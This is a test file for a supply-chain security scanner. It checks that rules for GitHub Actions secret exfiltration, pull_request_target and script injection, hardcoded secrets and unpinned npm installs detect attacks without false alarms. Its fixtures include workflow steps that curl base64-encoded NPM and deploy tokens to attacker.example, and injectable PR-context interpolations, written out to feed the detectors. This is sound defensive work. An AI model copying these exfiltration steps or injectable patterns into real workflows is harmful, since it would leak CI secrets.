import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scanGitHubActionsWorkflows } from "../github-actions-scanner.js";
import { scanDockerFile, isUnpinnedGlobalInstall } from "../dockerfile-scanner.js";
import { isLikelyRealSecretValue } from "../patterns.js";
import { applyPolicy } from "../policy-engine.js";
import { scan } from "../scanner.js";
import { classifyWorkflowLines } from "../workflow-ast.js";
import type { Finding } from "../types.js";

/**
 * Rule-precision fixes (v5.18).
 *
 * Every rule touched here gets BOTH halves of the contract:
 *   - a TRUE POSITIVE test proving the real attack the rule exists for is
 *     still detected, and
 *   - a FALSE POSITIVE test proving the benign pattern that motivated the fix
 *     is no longer reported.
 *
 * Workflow content is built with array.join("\n") so `${{ ... }}` is never
 * mis-parsed as a JS template literal (same convention as the other GHA tests).
 */
function writeWorkflow(baseDir: string, name: string, lines: string[]): void {
  const workflowDir = path.join(baseDir, ".github", "workflows");
  fs.mkdirSync(workflowDir, { recursive: true });
  fs.writeFileSync(path.join(workflowDir, name), lines.join("\n"));
}

describe("v5.18 rule precision", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-precision-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  // ── GHA_SECRET_EXFIL_MULTILINE: per-step, not a file-level sticky flag ────

  describe("GHA_SECRET_EXFIL_MULTILINE", () => {
    it("TRUE POSITIVE: a step whose env holds a secret and whose run curls it out", () => {
      writeWorkflow(tempDir, "steal.yml", [
        "name: Steal",
        "on: push",
        "jobs:",
        "  build:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: Collect",
        "        env:",
        "          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}",
        "        run: |",
        '          DATA=$(printf "%s" "$NPM_TOKEN" | base64)',
        '          curl -s -X POST -d "$DATA" https://attacker.example/collect',
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      const f = findings.find((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE");
      expect(f).toBeDefined();
      expect(f?.severity).toBe("high");
      // Points at the curl line inside the offending step, not at some other block.
      expect(f?.line).toBe(12);
    });

    it("TRUE POSITIVE: a job-level env secret is in scope for the step that curls", () => {
      writeWorkflow(tempDir, "joblevel.yml", [
        "on: push",
        "jobs:",
        "  build:",
        "    env:",
        "      TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
        "    steps:",
        "      - run: |",
        '          curl -X POST -d "$TOKEN" https://attacker.example/x',
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")).toBe(true);
    });

    it("points at the outbound call, not at a `git fetch` earlier in the step", () => {
      // `git fetch` pulls source INTO the runner and carries no secret out;
      // matching the bare word made the finding name a repository sync.
      writeWorkflow(tempDir, "deploy-sync.yml", [
        "on: push",
        "jobs:",
        "  deploy:",
        "    steps:",
        "      - name: Deploy via SSH",
        "        env:",
        "          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
        "        run: |",
        '          echo "$SSH_PRIVATE_KEY" > key',
        "          git fetch origin main",
        "          curl -fsS https://example.com/healthz",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      const f = findings.find((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE");
      expect(f).toBeDefined();
      expect(f?.line).toBe(11);
    });

    it("FALSE POSITIVE: a step that only runs `git fetch` with a secret in scope", () => {
      writeWorkflow(tempDir, "sync.yml", [
        "on: push",
        "jobs:",
        "  sync:",
        "    steps:",
        "      - env:",
        "          TOKEN: ${{ secrets.GITHUB_TOKEN }}",
        "        run: |",
        "          git fetch origin main",
        "          git reset --hard origin/main",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")).toBe(false);
    });

    it("FALSE POSITIVE: a later, secret-free step that merely uses curl", () => {
      // The old file-level `envSecretsExported` flag was sticky: once ANY step
      // put a secret in env:, every later run block containing "curl" was
      // reported - and the reported line pointed at the wrong block entirely.
      writeWorkflow(tempDir, "deploy.yml", [
        "name: Deploy",
        "on: workflow_dispatch",
        "permissions:",
        "  contents: read",
        "jobs:",
        "  deploy:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: Write key",
        "        env:",
        "          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
        "        run: |",
        '          echo "$SSH_PRIVATE_KEY" > key',
        "          chmod 600 key",
        "      - name: Readiness probe",
        "        run: |",
        "          curl -fsS https://example.com/ready",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")).toBe(false);
    });
  });

  // ── GHA_PPE_PULL_TARGET: exec sink + elevated trigger ────────────────────

  describe("GHA_PPE_PULL_TARGET", () => {
    it("TRUE POSITIVE: PR head sha interpolated into run: on pull_request_target", () => {
      // The elvatis/atlas pattern - the real PPE this rule exists to catch.
      writeWorkflow(tempDir, "ppe.yml", [
        "on: pull_request_target",
        "jobs:",
        "  build:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - run: |",
        "          git checkout ${{ github.event.pull_request.head.sha }}",
        "          npm run build",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      const f = findings.find((f) => f.rule === "GHA_PPE_PULL_TARGET");
      expect(f).toBeDefined();
      expect(f?.severity).toBe("critical");
      expect(f?.line).toBe(7);
    });

    it("TRUE POSITIVE: issue_comment trigger interpolating PR context into run:", () => {
      writeWorkflow(tempDir, "cmd.yml", [
        "on: issue_comment",
        "jobs:",
        "  run:",
        "    steps:",
        "      - run: echo ${{ github.event.pull_request.head.ref }}",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(true);
    });

    it("TRUE POSITIVE: env: hop that is read back with ${{ env.X }} inside run:", () => {
      // Moving the value into env: only helps if the shell reads $SHA. Reading
      // it back through the env CONTEXT is still template interpolation.
      writeWorkflow(tempDir, "envhop.yml", [
        "on: pull_request_target",
        "jobs:",
        "  build:",
        "    steps:",
        "      - env:",
        "          SHA: ${{ github.event.pull_request.head.sha }}",
        "        run: echo ${{ env.SHA }}",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(true);
    });

    it("FALSE POSITIVE: PR context moved into env: (the official mitigation)", () => {
      writeWorkflow(tempDir, "pr-checks.yml", [
        "on:",
        "  pull_request:",
        "    types: [opened, edited, synchronize, reopened]",
        "jobs:",
        "  diff:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: Scan PR diff",
        "        env:",
        "          BASE_SHA: ${{ github.event.pull_request.base.sha }}",
        "          HEAD_SHA: ${{ github.event.pull_request.head.sha }}",
        "        run: |",
        '          echo "Scanning diff from $BASE_SHA to $HEAD_SHA"',
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(false);
    });

    it("FALSE POSITIVE: PR sha in run: under a plain pull_request trigger", () => {
      // No elevated context: a fork PR job has a read-only token and no
      // secrets, so the attacker gains nothing they did not already control.
      writeWorkflow(tempDir, "ci.yml", [
        "on:",
        "  push:",
        "    branches: [main]",
        "  pull_request:",
        "jobs:",
        "  changes:",
        "    steps:",
        "      - run: |",
        "          base_sha='${{ github.event.pull_request.base.sha }}'",
        "          head_sha='${{ github.event.pull_request.head.sha }}'",
        '          git diff --name-only "$base_sha" "$head_sha"',
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(false);
    });

    it("stays armed when the trigger cannot be determined (fail closed)", () => {
      writeWorkflow(tempDir, "notrigger.yml", [
        "jobs:",
        "  build:",
        "    steps:",
        "      - run: echo ${{ github.event.pull_request.head.sha }}",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(true);
    });

    it("stays armed for a reusable workflow whose caller may be privileged", () => {
      writeWorkflow(tempDir, "reusable.yml", [
        "on:",
        "  workflow_call:",
        "jobs:",
        "  build:",
        "    steps:",
        "      - run: echo ${{ github.event.pull_request.head.sha }}",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(true);
    });
  });

  // ── GHA_SCRIPT_INJECTION: exec sink only ─────────────────────────────────

  describe("GHA_SCRIPT_INJECTION", () => {
    it("TRUE POSITIVE: PR title interpolated into a run: block", () => {
      writeWorkflow(tempDir, "title.yml", [
        "on: pull_request_target",
        "jobs:",
        "  check:",
        "    steps:",
        '      - run: echo "${{ github.event.pull_request.title }}"',
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      const f = findings.find((f) => f.rule === "GHA_SCRIPT_INJECTION");
      expect(f).toBeDefined();
      expect(f?.severity).toBe("critical");
    });

    it("TRUE POSITIVE: issue body interpolated into a github-script script: body", () => {
      writeWorkflow(tempDir, "gs.yml", [
        "on: issues",
        "jobs:",
        "  triage:",
        "    steps:",
        "      - uses: actions/github-script@v7",
        "        with:",
        "          script: |",
        "            const body = `${{ github.event.issue.body }}`",
        "            console.log(body)",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(true);
    });

    it("TRUE POSITIVE: env: hop read back with ${{ env.X }} inside run:", () => {
      writeWorkflow(tempDir, "envhop2.yml", [
        "on: issues",
        "jobs:",
        "  triage:",
        "    steps:",
        "      - env:",
        "          BODY: ${{ github.event.issue.body }}",
        "        run: echo ${{ env.BODY }}",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(true);
    });

    it("FALSE POSITIVE: PR title in env:, read as a shell variable", () => {
      // This is verbatim what the rule's own recommendation tells users to do.
      writeWorkflow(tempDir, "safe-title.yml", [
        "on: pull_request",
        "jobs:",
        "  pr-title:",
        "    steps:",
        "      - name: Check PR title format",
        "        env:",
        "          PR_TITLE: ${{ github.event.pull_request.title }}",
        "        run: |",
        '          echo "PR title: $PR_TITLE"',
        '          echo "$PR_TITLE" | grep -Eq "^(feat|fix): ."',
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(false);
    });

    it("FALSE POSITIVE: untrusted context passed as a with: input", () => {
      // with: inputs reach the action as INPUT_* environment variables, not as
      // shell text (the github-script `script:` input is handled above).
      writeWorkflow(tempDir, "with-input.yml", [
        "on: issues",
        "jobs:",
        "  label:",
        "    steps:",
        "      - uses: some/labeler@v1",
        "        with:",
        "          title: ${{ github.event.issue.title }}",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(false);
    });

    it("FALSE POSITIVE: a commented-out example inside a run: block", () => {
      writeWorkflow(tempDir, "comment.yml", [
        "on: issues",
        "jobs:",
        "  doc:",
        "    steps:",
        "      - run: |",
        "          # never do: echo ${{ github.event.issue.body }}",
        "          echo ok",
      ]);
      const findings = scanGitHubActionsWorkflows(tempDir);
      expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(false);
    });
  });

  // ── the line-region classifier the two rules above are built on ──────────

  describe("classifyWorkflowLines", () => {
    it("separates run:/script: bodies from env: mappings", () => {
      const regions = classifyWorkflowLines(
        [
          "jobs:", // 0 other
          "  a:", // 1 other
          "    steps:", // 2 other
          "      - env:", // 3 other (header)
          "          X: 1", // 4 env
          "        run: |", // 5 other (header)
          "          env: not-yaml", // 6 exec (opaque shell text)
          "        with:", // 7 other
          "          script: |", // 8 other (header)
          "            core.info('x')", // 9 exec
        ].join("\n"),
      );
      expect(regions[4]).toBe("env");
      expect(regions[6]).toBe("exec");
      expect(regions[9]).toBe("exec");
      expect(regions[7]).toBe("other");
    });

    it("treats an inline run: command as executed", () => {
      const regions = classifyWorkflowLines(
        ["steps:", "  - run: echo hi", "  - uses: actions/checkout@v4"].join("\n"),
      );
      expect(regions[1]).toBe("exec");
      expect(regions[2]).toBe("other");
    });
  });

  // ── IAC_HARDCODED_SECRET: inspect the value, not just the shape ──────────

  describe("IAC_HARDCODED_SECRET", () => {
    it("TRUE POSITIVE: an actual embedded credential", async () => {
      fs.writeFileSync(
        path.join(tempDir, "main.tf"),
        'resource "aws_db_instance" "db" {\n  password = "Pr0dDbP4ss!7xQ"\n}\n',
      );
      const report = await scan({ target: tempDir, format: "text" });
      const f = report.findings.find((f) => f.rule === "IAC_HARDCODED_SECRET");
      expect(f).toBeDefined();
      expect(f?.severity).toBe("critical");
    });

    it("TRUE POSITIVE: a committed API key literal", () => {
      expect(isLikelyRealSecretValue("sk_live_51H8xY2eZvKYlo2CmT4x9")).toBe(true);
      expect(isLikelyRealSecretValue("AKIAIOSFODNN7EXAMPLE")).toBe(true);
      expect(isLikelyRealSecretValue("ghp_16C7e42F292c6912E7710c838347Ae178B4a")).toBe(true);
    });

    it("FALSE POSITIVE: a shell/terraform variable reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deploy.tf"),
        'provider "redis" {\n  password = "${REDIS_PASSWORD}"\n}\n',
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "IAC_HARDCODED_SECRET")).toBeUndefined();
    });

    it("FALSE POSITIVE: a password that is GENERATED by command substitution", async () => {
      fs.writeFileSync(
        path.join(tempDir, "quickstart.hcl"),
        'password="$(openssl rand -base64 32)"\n',
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "IAC_HARDCODED_SECRET")).toBeUndefined();
    });

    it("FALSE POSITIVE: a namespace prefix constant", async () => {
      fs.writeFileSync(
        path.join(tempDir, "pat.ts"),
        'const token = "trust_pat_"\nexport const full = token + randomBytes(24).toString("hex")\n',
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.find((f) => f.rule === "IAC_HARDCODED_SECRET")).toBeUndefined();
    });

    it("rejects references, prefixes, paths and placeholders at the value level", () => {
      expect(isLikelyRealSecretValue("${REDIS_PASSWORD}")).toBe(false);
      expect(isLikelyRealSecretValue("$REGISTRY_PASSWORD")).toBe(false);
      expect(isLikelyRealSecretValue("$(openssl rand -base64 32)")).toBe(false);
      expect(isLikelyRealSecretValue("${{ secrets.TOKEN }}")).toBe(false);
      expect(isLikelyRealSecretValue("%DB_PASSWORD%")).toBe(false);
      expect(isLikelyRealSecretValue("trust_pat_")).toBe(false);
      expect(isLikelyRealSecretValue("/etc/ssl/private/server.key")).toBe(false);
      expect(isLikelyRealSecretValue("your_secret_here")).toBe(false);
      expect(isLikelyRealSecretValue("undefined")).toBe(false);
    });
  });

  // ── DOCKER_NPM_GLOBAL: pinned installs are what the rule asks for ────────

  describe("DOCKER_NPM_GLOBAL", () => {
    it("TRUE POSITIVE: unpinned global install", () => {
      const findings = scanDockerFile("RUN npm install -g some-package", "Dockerfile");
      expect(findings.some((f) => f.rule === "DOCKER_NPM_GLOBAL")).toBe(true);
    });

    it("TRUE POSITIVE: dist-tag and range selectors are not pins", () => {
      expect(isUnpinnedGlobalInstall("npm@latest")).toBe(true);
      expect(isUnpinnedGlobalInstall("pnpm@next")).toBe(true);
      expect(isUnpinnedGlobalInstall("pnpm@^9.1.0")).toBe(true);
      expect(isUnpinnedGlobalInstall("pnpm@9.x")).toBe(true);
      expect(isUnpinnedGlobalInstall("@scope/tool")).toBe(true);
      // one pinned + one unpinned package still reports
      expect(isUnpinnedGlobalInstall("pnpm@9.15.0 typescript")).toBe(true);
    });

    it("TRUE POSITIVE: the npm i / add aliases are covered too", () => {
      expect(scanDockerFile("RUN npm i -g leftpad", "Dockerfile")
        .some((f) => f.rule === "DOCKER_NPM_GLOBAL")).toBe(true);
      expect(scanDockerFile("RUN npm add --global leftpad", "Dockerfile")
        .some((f) => f.rule === "DOCKER_NPM_GLOBAL")).toBe(true);
    });

    it("FALSE POSITIVE: version-pinned global installs", () => {
      const pinned = [
        "RUN npm install -g pnpm@9",
        "RUN npm install -g npm@11.18.0 && npm cache clean --force",
        "RUN npm install -g @scope/tool@1.2.3",
        "RUN npm install -g /tmp/supply-chain-guard-5.0.0.tgz",
      ];
      for (const line of pinned) {
        expect(
          scanDockerFile(line, "Dockerfile").some((f) => f.rule === "DOCKER_NPM_GLOBAL"),
          line,
        ).toBe(false);
      }
    });

    it("keeps reporting when the spec cannot be read (fail closed)", () => {
      expect(isUnpinnedGlobalInstall("$PACKAGES")).toBe(true);
      expect(isUnpinnedGlobalInstall("--force")).toBe(true);
    });
  });

  // ── allowlist.githubOrgs is enforced, not silently dropped ───────────────

  describe("allowlist.githubOrgs", () => {
    const actionFinding = (rule: string, ref: string): Finding => ({
      rule,
      description: `Action "${ref}" is from third-party owner "${ref.split("/")[0]}".`,
      severity: "low",
      file: ".github/workflows/ci.yml",
      line: 7,
      match: ref,
    });

    it("suppresses ownership-trust findings for an allowlisted org", () => {
      const result = applyPolicy(
        [
          actionFinding("GHA_THIRD_PARTY_ACTION", "my-org/deploy-action@v1"),
          actionFinding("GHA_TAG_NOT_SHA", "my-org/deploy-action@v1"),
        ],
        { allowlist: { githubOrgs: ["My-Org"] } },
      );
      expect(result.findings).toHaveLength(0);
      expect(result.suppressedCount).toBe(2);
    });

    it("does NOT suppress findings for other owners", () => {
      const result = applyPolicy(
        [actionFinding("GHA_THIRD_PARTY_ACTION", "someone-else/action@v1")],
        { allowlist: { githubOrgs: ["my-org"] } },
      );
      expect(result.findings).toHaveLength(1);
    });

    it("does NOT suppress a known-malicious SHA for an allowlisted org", () => {
      // Trusting a publisher must never silence a confirmed-compromise finding.
      const finding: Finding = {
        rule: "GHA_KNOWN_MALICIOUS_SHA",
        description: 'Action "my-org/action@d8462b4" references a KNOWN COMPROMISED commit SHA.',
        severity: "critical",
        match: "my-org/action@d8462b4",
      };
      const result = applyPolicy([finding], { allowlist: { githubOrgs: ["my-org"] } });
      expect(result.findings).toHaveLength(1);
      expect(result.findings[0].severity).toBe("critical");
    });
  });
});
